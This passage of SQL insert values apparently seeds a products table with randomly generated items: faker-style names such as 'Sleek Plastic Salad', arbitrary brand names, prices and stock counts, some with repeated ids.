(6731,'Sleek Plastic Salad','Sharp','873349.00',318),
(6641,'Recycled Wooden Chair','Sony','875562.00',493),
(6843,'Modern Bronze Salad','Asus','383689.00',972),
(8150,'Rustic Steel Tuna','Uber','371783.00',843),
(3441,'Unbranded Wooden Soap','Polytron','593408.00',394),
(1449,'Practical Fresh Table','Apple','214519.00',184),
(1040,'Handmade Steel Shirt','Acer','338947.00',845),
(2384,'Incredible Plastic Shirt','Mitsubishi','91531.00',940),
(2904,'Refined Soft Cheese','Pepsodent','133416.00',598),
(3402,'Elegant Bronze Pants','Rolex','336081.00',357),
(2072,'Fantastic Metal Bacon','Unilever','64070.00',109),
(2010,'Licensed Wooden Pants','Uber','374125.00',720),
(8416,'Handmade Cotton Hat','Amazon','847354.00',593),
(5204,'Intelligent Granite Keyboard','Uber','710103.00',807),
(1078,'Generic Wooden Mouse','Samsung','202175.00',487),
(3721,'Small Concrete Chips','Aisan','865086.00',843),
(6082,'Generic Cotton Keyboard','Porsche','980212.00',785),
(3562,'Refined Soft Chair','Acer','394628.00',943),
(8892,'Unbranded Cotton Cheese','Mitsubishi','640652.00',667),
(3140,'Luxurious Granite Salad','Lamborghini','321321.00',787),
(3923,'Fantastic Bronze Soap','Lamborghini','92570.00',819),
(8467,'Handmade Frozen Chair','Robot','317321.00',510),
(5165,'Small Concrete Pizza','Kawasaki','254762.00',125),
(3531,'Bespoke Granite Cheese','Logitech','659205.00',209),
(3680,'Licensed Plastic Table','Vans','97238.00',693),
(1926,'Elegant Metal Shoes','Aisan','417704.00',737),
(9979,'Generic Concrete Keyboard','Nvidia','651045.00',560),
(3317,'Handcrafted Concrete Chair','Polytron','361553.00',161),
(6963,'Fantastic Wooden Table','Amazon','887733.00',988),
(3909,'Awesome Frozen Pizza','IBM','999109.00',506),
(6173,'Modern Soft Salad','Uniqlo','870783.00',165),
(3634,'Recycled Bronze Mouse','Nintendo','39886.00',908),
(6013,'Oriental Frozen Ball','Gucci','857439.00',626),
(3863,'Ergonomic Rubber Hat','ZTE','102122.00',919),
(2354,'Incredible Soft Tuna','HTC','86618.00',666),
(8174,'Bespoke Cotton Pizza','3M','248547.00',590),
(3365,'Electronic Frozen Soap','Xiaomi','233603.00',487),
(8108,'Handmade Metal Keyboard','Asus','337004.00',381),
(6680,'Ergonomic Cotton Mouse','Adobe','847180.00',161),
(8382,'Ergonomic Rubber Bacon','Mitsubishi','729475.00',330),
(6462,'Practical Soft Soap','Hyundai','625815.00',101),
(6322,'Sleek Plastic Hat','Polytron','963417.00',321),
(7546,'Bespoke Soft Pants','Adobe','364971.00',610),
(7759,'Incredible Soft Chips','Intel','747079.00',224),
(1459,'Gorgeous Soft Shirt','Toyota','40907.00',837),
(9892,'Awesome Cotton Gloves','Lamborghini','604232.00',631),
(8192,'Ergonomic Plastic Cheese','Gucci','111201.00',304),
(9612,'Intelligent Granite Soap','Samsung','381705.00',148),
(3066,'Small Steel Hat','Unilever','693648.00',847),
(5821,'Intelligent Frozen Shoes','Crocs','980822.00',333),
(1903,'Oriental Fresh Chips','Rolex','857567.00',663),
(5821,'Oriental Bronze Chips','Kawasaki','746604.00',742),
(9484,'Electronic Concrete Pizza','Uber','487655.00',790),
(1652,'Sleek Bronze Table','Mitsubishi','210361.00',388),
(7569,'Generic Rubber Hat','Robot','874415.00',915),
(2974,'Gorgeous Cotton Gloves','IBM','987735.00',494),
(8236,'Incredible Concrete Hat','Logitech','745178.00',187),
(1046,'Ergonomic Soft Mouse','Xiaomi','286512.00',181),
(7769,'Fantastic Cotton Chips','Motorola','606307.00',340),
(7819,'Oriental Cotton Computer','Nintendo','365803.00',829),
(3566,'Sleek Cotton Cheese','Kawasaki','431472.00',181),
(9629,'Generic Frozen Chicken','Sharp','572125.00',129),
(1723,'Recycled Granite Bike','Nintendo','740618.00',253),
(2880,'Generic Steel Table','Lamborghini','429886.00',150),
(9450,'Ergonomic Granite Car','Chanel','502689.00',473),
(8564,'Fantastic Plastic Cheese','Audi','27138.00',802),
(6927,'Gorgeous Fresh Shoes','Amazon','539965.00',160),
(4512,'Luxurious Granite Salad','Samsung','597339.00',737),
(4302,'Fantastic Wooden Chair','Suzuki','512625.00',720),
(2962,'Incredible Steel Table','Toyota','317350.00',674),
(2654,'Handmade Rubber Ball','ZTE','672824.00',207),
(7830,'Oriental Rubber Computer','Mercedes','81278.00',598),
(4543,'Recycled Soft Chair','Microsoft','27936.00',558),
(9799,'Handmade Granite Ball','ZTE','898641.00',800),
(3269,'Ergonomic Steel Keyboard','Gucci','801306.00',665),
(2297,'Intelligent Fresh Shirt','Huawei','890648.00',664),
(4765,'Electronic Metal Ball','Philips','365866.00',254),
(9768,'Elegant Granite Towels','Yamaha','103989.00',135),
(1978,'Handmade Frozen Keyboard','IBM','800760.00',881),
(6150,'Incredible Fresh Shirt','Logitech','295602.00',559),
(7512,'Electronic Soft Bike','Nokia','623442.00',247),
(4088,'Handmade Metal Bacon','Gucci','156594.00',185),
(6563,'Practical Soft Mouse','Nintendo','673584.00',148),
(5453,'Luxurious Steel Ball','Adidas','109343.00',935),
(7646,'Generic Fresh Gloves','Crocs','627554.00',178),
(3654,'Sleek Frozen Chicken','Crocs','864624.00',771),
(5594,'Sleek Granite Soap','IBM','476264.00',194),
(5752,'Licensed Wooden Chips','Crocs','443923.00',701),
(3504,'Small Concrete Keyboard','Asus','457303.00',154),
(2567,'Oriental Wooden Pizza','Aisan','576316.00',891),
(8584,'Handmade Soft Car','Amazon','901113.00',826),
(9908,'Tasty Bronze Bike','Ferarri','804313.00',994),
(8455,'Ergonomic Steel Table','Nokia','225924.00',445),
(1322,'Tasty Concrete Chicken','Uniqlo','655706.00',730),
(2507,'Small Rubber Pizza','Aisan','466302.00',448),
(1956,'Handmade Soft Pants','Microsoft','461673.00',845),
(3485,'Handmade Granite Soap','HTC','206570.00',723),
(4714,'Small Concrete Chips','Porsche','89917.00',374),
(5179,'Awesome Concrete Car','Porsche','459673.00',817),
(6590,'Incredible Rubber Chair','Acer','552685.00',482),
(6874,'Sleek Concrete Gloves','Uber','448122.00',599),
(7623,'Ergonomic Bronze Tuna','Lamborghini','179663.00',287),
(1056,'Refined Fresh Tuna','Alienware','607429.00',344),
(4685,'Bespoke Metal Car','Microsoft','525409.00',220),
(6432,'Refined Fresh Car','Amazon','596127.00',176),
(5943,'Oriental Steel Car','Tesla','689888.00',127),
(7758,'Bespoke Plastic Salad','Alienware','182580.00',926),
(9104,'Generic Wooden Computer','Audi','798045.00',208),
(9818,'Handmade Metal Towels','Polytron','267898.00',813),
(9910,'Small Bronze Cheese','Unilever','657549.00',568),
(4506,'Handmade Plastic Hat','Adidas','71394.00',884),
(6527,'Licensed Bronze Car','Apple','949595.00',820),
(8686,'Ergonomic Cotton Gloves','Alienware','903383.00',607),
(6390,'Unbranded Rubber Car','FedEx','555539.00',770),
(4170,'Sleek Cotton Towels','Toyota','409663.00',788),
(2725,'Tasty Bronze Ball','Motorola','294512.00',159),
(5090,'Electronic Wooden Chicken','Apple','24700.00',498),
(9787,'Handcrafted Bronze Gloves','Pepsodent','595646.00',555),
(4035,'Awesome Wooden Ball','Lamborghini','80865.00',212),
(1986,'Recycled Concrete Shoes','Nvidia','977944.00',706),
(3878,'Elegant Metal Pizza','Vans','960196.00',423),
(6097,'Handcrafted Fresh Bike','Lenovo','572047.00',256),
(1289,'Small Steel Hat','HBO','854048.00',119),
(4029,'Practical Plastic Computer','Acer','539743.00',986),
(5624,'Rustic Metal Shirt','Vans','579408.00',668),
(8811,'Ergonomic Fresh Computer','Xiaomi','469286.00',333),
(3987,'Rustic Cotton Tuna','Toshiba','719721.00',957),
(8252,'Awesome Steel Shirt','Apple','563993.00',514),
(9312,'Recycled Steel Ball','Hyundai','212195.00',619),
(6479,'Generic Plastic Computer','IBM','462055.00',660),
(3078,'Modern Steel Pizza','Adidas','624285.00',407),
(9420,'Electronic Rubber Mouse','Adidas','934304.00',621),
(7890,'Handcrafted Frozen Hat','Audi','176463.00',702),
(6738,'Unbranded Metal Chips','FedEx','172625.00',576),
(8123,'Incredible Rubber Chips','Rolex','794171.00',954),
(1443,'Luxurious Frozen Car','Huawei','640965.00',651),
(4619,'Ergonomic Cotton Cheese','ZTE','837632.00',994),
(9925,'Modern Frozen Mouse','Aisan','991999.00',565),
(5806,'Handmade Soft Bike','Ferarri','540458.00',208),
(9898,'Elegant Plastic Pizza','Mercedes','989014.00',383),
(6070,'Gorgeous Rubber Pants','Apple','703041.00',558),
(6254,'Electronic Fresh Towels','AMD','392156.00',391),
(7161,'Ergonomic Fresh Chair','Asus','474255.00',343),
(5317,'Handmade Steel Chicken','Intel','448026.00',467),
(4025,'Ergonomic Steel Car','Toshiba','384086.00',954),
(6660,'Ergonomic Plastic Mouse','Motorola','690108.00',980),
(3813,'Ergonomic Granite Sausages','Philips','124804.00',388),
(8766,'Ergonomic Steel Chips','Xiaomi','758244.00',551),
(3116,'Incredible Cotton Bike','Nvidia','781917.00',863),
(8798,'Practical Plastic Pants','Uniqlo','454862.00',884),
(5664,'Unbranded Granite Bacon','Asus','822623.00',786),
(9937,'Sleek Cotton Shirt','ZTE','773672.00',991),
(2271,'Small Soft Computer','Uber','80593.00',364),
(2500,'Generic Frozen Computer','Vans','574693.00',916),
(5721,'Practical Rubber Towels','Microsoft','260649.00',614),
(5501,'Intelligent Wooden Mouse','Aisan','679668.00',881),
(3852,'Electronic Frozen Towels','Uber','314867.00',632),
(8671,'Practical Soft Hat','Acer','804838.00',870),
(5515,'Refined Bronze Shoes','IBM','466613.00',211),
(8383,'Licensed Metal Mouse','Nintendo','523591.00',953),
(9513,'Practical Cotton Keyboard','Microsoft','74701.00',838),
(8720,'Gorgeous Bronze Ball','Uniqlo','868588.00',620),
(4646,'Incredible Bronze Fish','Mercedes','301989.00',741),
(4971,'Luxurious Rubber Soap','Disney','134506.00',407),
(1294,'Unbranded Metal Salad','Unilever','838319.00',987),
(2452,'Gorgeous Fresh Chair','Yamaha','322223.00',704),
(7435,'Electronic Concrete Gloves','Pepsodent','686462.00',389),
(3443,'Small Plastic Chair','Motorola','638559.00',557),
(9516,'Handmade Metal Computer','Porsche','701927.00',611),
(5787,'Oriental Granite Cheese','Lenovo','113918.00',195),
(2063,'Unbranded Concrete Keyboard','3M','538081.00',325),
(4838,'Practical Plastic Towels','Uniqlo','612732.00',200),
(7034,'Elegant Plastic Hat','Ferarri','528661.00',965),
(4196,'Tasty Bronze Ball','Toshiba','536986.00',538),
(2316,'Small Cotton Cheese','Xiaomi','157083.00',906),
(5785,'Unbranded Soft Computer','Intel','874635.00',793),
(7698,'Small Steel Hat','Kawasaki','888927.00',228),
(7844,'Electronic Frozen Bike','Adidas','29541.00',988),
(1459,'Handmade Plastic Keyboard','Rolex','303389.00',439),
(9297,'Fantastic Frozen Soap','FedEx','348916.00',535),
(8238,'Bespoke Wooden Chicken','Nike','713502.00',399),
(2726,'Practical Soft Towels','Acer','53654.00',679),
(2334,'Generic Soft Pants','Philips','841164.00',668),
(2342,'Awesome Metal Hat','Adidas','225547.00',676),
(2192,'Small Plastic Salad','Samsung','667943.00',129),
(8831,'Electronic Concrete Car','Apple','517959.00',227),
(6092,'Sleek Steel Sausages','Nike','650567.00',927),
(6081,'Electronic Wooden Shoes','Lamborghini','669896.00',691),
(1051,'Bespoke Plastic Pants','Amazon','277104.00',934),
(2438,'Oriental Metal Gloves','Yamaha','617030.00',106),
(2975,'Luxurious Fresh Hat','Adidas','255056.00',613),
(4513,'Fantastic Concrete Pizza','Audi','116683.00',167),
(4677,'Handmade Rubber Towels','FedEx','777914.00',884),
(7563,'Generic Cotton Chair','Aisan','306592.00',326),
(2825,'Luxurious Frozen Cheese','Logitech','630870.00',208),
(3010,'Gorgeous Soft Bike','Microsoft','806229.00',391),
(4753,'Luxurious Bronze Salad','Logitech','132262.00',634),
(2293,'Awesome Rubber Ball','Audi','239186.00',409),
(5930,'Rustic Frozen Hat','IBM','913328.00',967),
(5145,'Small Cotton Towels','Unilever','272559.00',453),
(4445,'Incredible Cotton Chicken','Toyota','54723.00',516),
(5034,'Licensed Granite Gloves','Porsche','373468.00',291),
(3230,'Tasty Soft Bike','Nike','665411.00',472),
(2619,'Modern Cotton Car','Adidas','992941.00',421),
(5871,'Intelligent Wooden Chair','Alienware','240182.00',784),
(1342,'Unbranded Plastic Sausages','Logitech','527179.00',835),
(2852,'Fantastic Concrete Soap','Unilever','41290.00',188),
(2283,'Electronic Fresh Gloves','Tesla','756030.00',581),
(1813,'Gorgeous Concrete Ball','Intel','451733.00',307),
(3577,'Elegant Rubber Bacon','HBO','171717.00',153),
(8572,'Gorgeous Frozen Sausages','Polytron','549055.00',747),
(4159,'Intelligent Wooden Chicken','Robot','375679.00',275),
(7084,'Sleek Plastic Bike','Nvidia','17735.00',531),
(3530,'Generic Steel Car','Nike','131845.00',579),
(3860,'Elegant Cotton Pizza','Disney','786345.00',764),
(5828,'Modern Wooden Computer','Nokia','882154.00',599),
(6009,'Gorgeous Soft Mouse','Huawei','50385.00',137),
(2880,'Fantastic Steel Ball','Yamaha','663420.00',531),
(9373,'Gorgeous Metal Bike','Gucci','252877.00',310),
(2830,'Tasty Wooden Bacon','Lamborghini','586306.00',308),
(5626,'Rustic Rubber Towels','Alienware','285460.00',804),
(1195,'Ergonomic Steel Pants','ZTE','281459.00',857),
(8780,'Ergonomic Soft Car','Vans','437014.00',623),
(9175,'Handcrafted Bronze Bacon','Microsoft','369154.00',713),
(1243,'Elegant Frozen Computer','Nintendo','462676.00',319),
(1582,'Small Plastic Towels','Microsoft','337750.00',287),
(1202,'Rustic Frozen Tuna','Aisan','16578.00',339),
(8383,'Ergonomic Plastic Car','Sharp','718213.00',789),
(4495,'Recycled Granite Bacon','Robot','913222.00',622),
(8394,'Licensed Granite Car','Porsche','840262.00',671),
(4969,'Intelligent Fresh Chicken','Logitech','782563.00',613),
(8656,'Intelligent Frozen Bike','Huawei','116687.00',898),
(5500,'Tasty Fresh Hat','Aisan','795993.00',801),
(4207,'Awesome Bronze Chair','Vans','866865.00',902),
(2472,'Modern Metal Tuna','Nintendo','439460.00',217),
(8491,'Intelligent Concrete Chair','Ferarri','736021.00',478),
(8978,'Luxurious Metal Table','Uber','612620.00',582),
(1908,'Incredible Concrete Cheese','FedEx','737972.00',953),
(5488,'Elegant Bronze Bacon','ZTE','449703.00',666),
(6197,'Recycled Bronze Bacon','Xiaomi','408438.00',215),
(2985,'Intelligent Wooden Computer','Uniqlo','152396.00',614),
(3479,'Luxurious Granite Fish','Philips','130535.00',391),
(7948,'Handcrafted Steel Table','Nvidia','605443.00',401),
(1956,'Recycled Granite Chips','FedEx','105745.00',519),
(6471,'Licensed Bronze Salad','Toyota','672562.00',646),
(1043,'Refined Frozen Table','Polytron','817891.00',441),
(2312,'Ergonomic Bronze Cheese','Uniqlo','516827.00',726),
(6148,'Refined Bronze Shirt','Polytron','359502.00',698),
(6316,'Tasty Metal Salad','Crocs','445626.00',902),
(8113,'Recycled Frozen Soap','Adobe','279219.00',284),
(5681,'Electronic Steel Chicken','Gucci','739711.00',663),
(3512,'Sleek Rubber Salad','Alienware','678642.00',377),
(2558,'Rustic Granite Gloves','AMD','244399.00',888),
(3338,'Practical Frozen Bacon','Uniqlo','923201.00',232),
(4602,'Practical Bronze Gloves','Microsoft','273799.00',876),
(5436,'Luxurious Metal Chair','Xiaomi','299088.00',929),
(2657,'Licensed Wooden Bike','Uber','458564.00',165),
(1947,'Recycled Metal Ball','Nokia','853729.00',906),
(8848,'Intelligent Plastic Chicken','Apple','361190.00',689),
(6462,'Luxurious Soft Ball','Sharp','851881.00',407),
(8114,'Incredible Concrete Fish','Chanel','852166.00',136),
(9152,'Luxurious Steel Car','Rolex','48856.00',471),
(1261,'Awesome Concrete Pizza','Tesla','227153.00',536),
(8843,'Modern Rubber Tuna','AMD','324112.00',185),
(3083,'Sleek Soft Cheese','Asus','981190.00',775),
(8376,'Bespoke Concrete Soap','Asus','229891.00',213),
(9257,'Unbranded Cotton Salad','Pepsodent','352015.00',898),
(3508,'Generic Steel Soap','Kawasaki','305543.00',140),
(5336,'Elegant Fresh Gloves','Porsche','216437.00',781),
(8597,'Handcrafted Fresh Pizza','Porsche','738065.00',789),
(3350,'Handcrafted Rubber Soap','IBM','791991.00',708),
(2582,'Electronic Rubber Tuna','FedEx','459429.00',871),
(4537,'Elegant Bronze Bacon','Asus','123013.00',390),
(3916,'Sleek Granite Chips','Alienware','151194.00',382),
(6634,'Incredible Metal Hat','Amazon','666746.00',450),
(7660,'Bespoke Plastic Table','Polytron','273650.00',282),
(2280,'Bespoke Fresh Chicken','ZTE','460990.00',895),
(3626,'Generic Frozen Gloves','Ferarri','933007.00',627),
(6708,'Sleek Rubber Salad','Alienware','204603.00',275),
(2824,'Practical Soft Hat','Pepsodent','338085.00',368),
(7854,'Tasty Concrete Bike','Unilever','834258.00',708),
(6697,'Intelligent Concrete Ball','Suzuki','456180.00',927),
(2845,'Licensed Wooden Pizza','Porsche','446420.00',647),
(7205,'Sleek Bronze Pants','Xiaomi','599410.00',267),
(1179,'Ergonomic Metal Ball','IBM','933573.00',537),
(8624,'Bespoke Plastic Sausages','Unilever','930979.00',368),
(8597,'Recycled Concrete Table','Amazon','748373.00',591),
(5263,'Gorgeous Cotton Pizza','FedEx','556180.00',974),
(6027,'Sleek Bronze Ball','Alienware','692735.00',559),
(5757,'Handmade Granite Shoes','Microsoft','171317.00',465),
(5607,'Unbranded Rubber Computer','Intel','886833.00',198),
(2573,'Generic Cotton Mouse','Mercedes','231004.00',301),
(8205,'Modern Concrete Pizza','Aisan','430016.00',836),
(3876,'Oriental Metal Shirt','Uber','951844.00',858),
(9980,'Fantastic Concrete Tuna','Lamborghini','147118.00',479),
(5591,'Ergonomic Soft Computer','Gucci','458311.00',936),
(6998,'Small Soft Mouse','Xiaomi','724784.00',648),
(2854,'Electronic Soft Car','Rolex','497159.00',363),
(3957,'Ergonomic Plastic Bacon','Toshiba','136082.00',748),
(9454,'Generic Plastic Shirt','Audi','389459.00',808),
(7871,'Tasty Plastic Shirt','Philips','868156.00',721),
(3334,'Rustic Rubber Chicken','Unilever','166849.00',595),
(8630,'Refined Cotton Shirt','Hyundai','78444.00',950),
(7032,'Unbranded Metal Bacon','Ferarri','844374.00',342),
(5944,'Gorgeous Fresh Computer','Intel','64426.00',565),
(8218,'Tasty Concrete Car','HBO','331021.00',873),
(3796,'Handcrafted Metal Shoes','Yamaha','29060.00',690),
(7485,'Ergonomic Wooden Pizza','HBO','46224.00',937),
(4809,'Licensed Metal Chips','Rolex','642639.00',627),
(1736,'Small Concrete Keyboard','AMD','216601.00',856),
(4070,'Handmade Wooden Gloves','Suzuki','96524.00',430),
(1911,'Handmade Rubber Hat','Acer','901178.00',280),
(8227,'Recycled Steel Gloves','Alienware','129240.00',374),
(2654,'Generic Plastic Chair','Vans','398132.00',763),
(4876,'Rustic Plastic Table','Lamborghini','649940.00',884),
(2320,'Recycled Bronze Pizza','HBO','585262.00',771),
(3884,'Electronic Soft Cheese','Asus','485058.00',222),
(3991,'Bespoke Metal Keyboard','FedEx','250436.00',522),
(1545,'Handcrafted Soft Chicken','Gucci','748297.00',398),
(9348,'Generic Soft Towels','FedEx','366693.00',667),
(1718,'Gorgeous Steel Bike','ZTE','360835.00',509),
(5489,'Recycled Rubber Pants','Nvidia','288288.00',255),
(1885,'Refined Plastic Cheese','Uber','977091.00',993),
(7048,'Awesome Granite Computer','Crocs','545049.00',484),
(8150,'Unbranded Metal Hat','FedEx','491431.00',885),
(9889,'Handcrafted Concrete Pizza','Chanel','835444.00',511),
(1158,'Small Fresh Hat','HTC','391745.00',484),
(2526,'Licensed Granite Shirt','Sony','805037.00',115),
(5351,'Gorgeous Metal Shirt','Adidas','732427.00',723),
(4321,'Ergonomic Soft Pants','ZTE','547382.00',795),
(5732,'Generic Bronze Shoes','Mitsubishi','605713.00',420),
(4156,'Practical Metal Chips','Disney','236132.00',778),
(1307,'Bespoke Cotton Shoes','Asus','836938.00',197),
(3182,'Refined Bronze Fish','Kawasaki','188855.00',834),
(8772,'Handmade Granite Shirt','Hyundai','714266.00',986),
(2752,'Handcrafted Plastic Pants','Nvidia','758017.00',820),
(2378,'Licensed Granite Bacon','Aisan','450847.00',150),
(5637,'Fantastic Soft Chair','Asus','949632.00',484),
(2158,'Gorgeous Steel Keyboard','Microsoft','573349.00',107),
(6202,'Awesome Metal Soap','Asus','369374.00',791),
(3714,'Sleek Wooden Pants','HBO','322930.00',394),
(9963,'Licensed Frozen Soap','3M','553435.00',535),
(2863,'Licensed Cotton Fish','Polytron','658415.00',291),
(3891,'Oriental Steel Towels','Unilever','472509.00',737),
(8140,'Intelligent Wooden Tuna','Motorola','779226.00',936),
(3719,'Fantastic Frozen Sausages','Nokia','188725.00',237),
(3560,'Incredible Fresh Ball','Kawasaki','269864.00',489),
(8900,'Incredible Fresh Tuna','Crocs','848289.00',202),
(1619,'Generic Metal Fish','AMD','646441.00',107),
(6655,'Unbranded Wooden Table','Acer','267193.00',796),
(4193,'Handcrafted Fresh Hat','IBM','645928.00',729),
(9965,'Handmade Rubber Towels','Hyundai','966636.00',353),
(5953,'Oriental Wooden Cheese','Adidas','179505.00',228),
(1426,'Modern Bronze Towels','Porsche','902028.00',908),
(3893,'Licensed Frozen Hat','Microsoft','167478.00',329),
(9485,'Oriental Plastic Towels','Toyota','252034.00',925),
(7500,'Fantastic Plastic Chips','Polytron','93127.00',518),
(8360,'Intelligent Concrete Car','Mercedes','839264.00',694),
(2409,'Handmade Bronze Pants','Sony','111789.00',755),
(1881,'Ergonomic Concrete Ball','Uniqlo','649029.00',604),
(1233,'Recycled Soft Chicken','Microsoft','362907.00',720),
(9927,'Fantastic Granite Chicken','Adobe','955430.00',557),
(9082,'Modern Steel Towels','Amazon','415875.00',674),
(2926,'Unbranded Granite Keyboard','Uniqlo','15228.00',975),
(2011,'Intelligent Concrete Sausages','Amazon','571013.00',242),
(2012,'Incredible Cotton Chicken','Porsche','585557.00',910),
(5402,'Fantastic Frozen Tuna','Crocs','971143.00',459),
(5402,'Rustic Wooden Chips','Tesla','691266.00',611),
(2111,'Luxurious Bronze Chair','Apple','42342.00',275),
(6334,'Oriental Rubber Chicken','Rolex','131871.00',940),
(1865,'Modern Cotton Computer','ZTE','175064.00',901),
(2078,'Ergonomic Metal Ball','Amazon','346941.00',929),
(1247,'Practical Concrete Chair','IBM','96813.00',983),
(2221,'Small Plastic Cheese','Aisan','950998.00',251),
(1086,'Sleek Frozen Keyboard','Tesla','479561.00',151),
(2405,'Rustic Concrete Chicken','Nintendo','494060.00',953),
(6879,'Fantastic Metal Bacon','Uniqlo','644943.00',207),
(4975,'Luxurious Frozen Cheese','Alienware','245819.00',831),
(1005,'Intelligent Soft Gloves','Hyundai','832873.00',758),
(4353,'Electronic Steel Bacon','Yamaha','709867.00',737),
(9367,'Tasty Metal Pants','Porsche','54718.00',307),
(9552,'Luxurious Plastic Pants','ZTE','499376.00',801),
(4496,'Handcrafted Plastic Shirt','Intel','124093.00',894),
(5571,'Fantastic Bronze Chips','Tesla','359187.00',801),
(2168,'Generic Concrete Cheese','Toyota','494705.00',722),
(3383,'Tasty Cotton Keyboard','FedEx','83906.00',183),
(7418,'Bespoke Granite Chair','IBM','465002.00',506),
(3721,'Fantastic Frozen Keyboard','Tesla','18878.00',105),
(5149,'Tasty Soft Soap','Alienware','722472.00',532),
(3551,'Bespoke Frozen Chair','Samsung','219061.00',396),
(4576,'Tasty Cotton Chair','Nintendo','927405.00',577),
(6814,'Unbranded Concrete Bike','Vans','988936.00',666),
(7864,'Small Steel Soap','Vans','729718.00',175),
(2422,'Luxurious Plastic Pants','Gucci','50574.00',867),
(2847,'Electronic Plastic Mouse','Xiaomi','115411.00',829),
(5186,'Handmade Plastic Chair','Sony','608319.00',343),
(2838,'Sleek Frozen Bacon','IBM','861812.00',264),
(9007,'Unbranded Soft Chips','Logitech','915268.00',251),
(1380,'Rustic Steel Gloves','ZTE','350029.00',250),
(1456,'Licensed Bronze Ball','Pepsodent','774016.00',845),
(3342,'Electronic Metal Chair','Pepsodent','60567.00',725),
(7149,'Licensed Granite Towels','Gucci','508568.00',622),
(3128,'Generic Bronze Tuna','Lamborghini','506772.00',513),
(7658,'Sleek Soft Soap','Porsche','423682.00',759),
(4431,'Oriental Cotton Towels','Crocs','892237.00',717),
(4764,'Intelligent Cotton Bike','Sharp','869803.00',910),
(7626,'Luxurious Cotton Computer','Toyota','589555.00',547),
(6664,'Intelligent Soft Salad','Toshiba','158117.00',488),
(7275,'Small Frozen Mouse','Pepsodent','70553.00',308),
(8557,'Awesome Cotton Sausages','Toyota','76534.00',129),
(2254,'Recycled Steel Bike','Alienware','498143.00',670),
(6361,'Small Fresh Hat','Kawasaki','648805.00',621),
(9947,'Small Wooden Gloves','Sony','561597.00',910),
(7746,'Electronic Concrete Towels','Lenovo','425575.00',259),
(5546,'Elegant Concrete Cheese','Robot','296659.00',236),
(7443,'Fantastic Rubber Mouse','Audi','206425.00',696),
(5509,'Recycled Wooden Bacon','Lamborghini','470536.00',304),
(5958,'Tasty Cotton Towels','Ferarri','968017.00',229),
(6784,'Oriental Granite Soap','Chanel','35314.00',646),
(6794,'Licensed Metal Salad','Ferarri','534885.00',762),
(4204,'Elegant Steel Bike','FedEx','296484.00',897),
(4651,'Recycled Metal Keyboard','Xiaomi','851728.00',323),
(7886,'Fantastic Bronze Sausages','Toshiba','780263.00',363),
(1099,'Generic Plastic Pizza','Crocs','429385.00',972),
(6770,'Sleek Fresh Salad','Sony','538683.00',152),
(7957,'Licensed Plastic Chips','Asus','99606.00',101),
(1933,'Luxurious Concrete Computer','Huawei','375838.00',238),
(6572,'Small Plastic Hat','Intel','55055.00',744),
(6932,'Refined Cotton Cheese','FedEx','196975.00',214),
(7365,'Gorgeous Cotton Shirt','Acer','608679.00',235),
(3170,'Ergonomic Granite Gloves','Aisan','121465.00',304),
(1973,'Handcrafted Wooden Bike','Nike','914492.00',540),
(6000,'Incredible Frozen Ball','Acer','408958.00',940),
(3022,'Rustic Soft Towels','Tesla','747331.00',148),
(5605,'Tasty Granite Chicken','Tesla','362978.00',670),
(8507,'Small Fresh Car','Chanel','833531.00',678),
(3800,'Recycled Concrete Fish','Huawei','636202.00',534),
(6134,'Luxurious Plastic Pants','Unilever','890984.00',110),
(4498,'Oriental Soft Car','Nintendo','319063.00',120),
(3677,'Electronic Bronze Mouse','Nike','477051.00',900),
(1505,'Incredible Metal Cheese','Acer','212277.00',168),
(5096,'Licensed Granite Pizza','Adidas','153869.00',409),
(5781,'Rustic Frozen Salad','Hyundai','912856.00',375),
(2170,'Sleek Bronze Soap','Samsung','649455.00',731),
(1923,'Bespoke Cotton Shoes','Pepsodent','147539.00',994),
(9170,'Generic Soft Gloves','Polytron','594377.00',717),
(2436,'Ergonomic Metal Mouse','Philips','787647.00',435),
(1278,'Unbranded Fresh Pants','Porsche','70707.00',533),
(7891,'Bespoke Steel Hat','Chanel','174652.00',370),
(4536,'Fantastic Rubber Towels','Nvidia','473769.00',849),
(7534,'Incredible Cotton Computer','Nokia','793101.00',396),
(1695,'Luxurious Concrete Gloves','Apple','364572.00',368),
(6223,'Refined Fresh Pizza','Unilever','262875.00',450),
(5171,'Licensed Frozen Mouse','HBO','820666.00',792),
(7521,'Ergonomic Plastic Chips','Lamborghini','171925.00',759),
(1812,'Ergonomic Bronze Chicken','Nike','308269.00',483),
(6025,'Oriental Wooden Pants','HBO','253982.00',458),
(8642,'Small Bronze Pizza','Lamborghini','443642.00',375),
(2535,'Unbranded Soft Shoes','Nvidia','970387.00',839),
(6315,'Oriental Rubber Tuna','Philips','986374.00',366),
(5043,'Handmade Cotton Shoes','Chanel','20020.00',667),
(4821,'Bespoke Rubber Ball','Samsung','493748.00',990),
(7663,'Electronic Bronze Fish','Motorola','513458.00',668),
(9750,'Electronic Steel Gloves','Hyundai','678086.00',419),
(6771,'Handmade Soft Chicken','Acer','987354.00',107),
(5744,'Intelligent Metal Hat','Audi','957323.00',182),
(6987,'Recycled Rubber Shirt','Nvidia','956226.00',398),
(3745,'Recycled Fresh Table','Toyota','975404.00',121),
(6657,'Oriental Steel Cheese','FedEx','551433.00',590),
(4802,'Luxurious Fresh Chips','Kawasaki','320240.00',314),
(2011,'Electronic Frozen Ball','Chanel','756247.00',128),
(9345,'Tasty Soft Chicken','Sony','309535.00',970),
(9545,'Handmade Bronze Pants','Asus','44758.00',939),
(1813,'Modern Wooden Towels','Mitsubishi','132381.00',379),
(9031,'Sleek Concrete Hat','Unilever','469263.00',313),
(9893,'Bespoke Soft Chips','Unilever','102196.00',645),
(4313,'Unbranded Frozen Cheese','Suzuki','978890.00',428),
(9277,'Tasty Wooden Salad','Yamaha','15597.00',133),
(2364,'Small Concrete Ball','Nokia','491977.00',527),
(8605,'Awesome Steel Bike','Apple','459362.00',923),
(1738,'Incredible Granite Towels','Toyota','639129.00',157),
(9378,'Handmade Wooden Hat','Philips','66049.00',775),
(8324,'Unbranded Steel Cheese','Gucci','25943.00',239),
(5890,'Elegant Steel Tuna','Sharp','157106.00',710),
(6525,'Unbranded Fresh Mouse','Ferarri','40395.00',352),
(8536,'Oriental Soft Chair','Chanel','86309.00',388),
(9537,'Generic Plastic Fish','3M','83369.00',889),
(9368,'Intelligent Rubber Cheese','Mitsubishi','472598.00',560),
(2873,'Elegant Granite Fish','Crocs','583180.00',747),
(6252,'Ergonomic Wooden Bacon','Samsung','136226.00',787),
(4839,'Generic Bronze Fish','IBM','592446.00',973),
(7408,'Electronic Cotton Salad','Huawei','784789.00',344),
(7137,'Tasty Rubber Table','Logitech','493322.00',164),
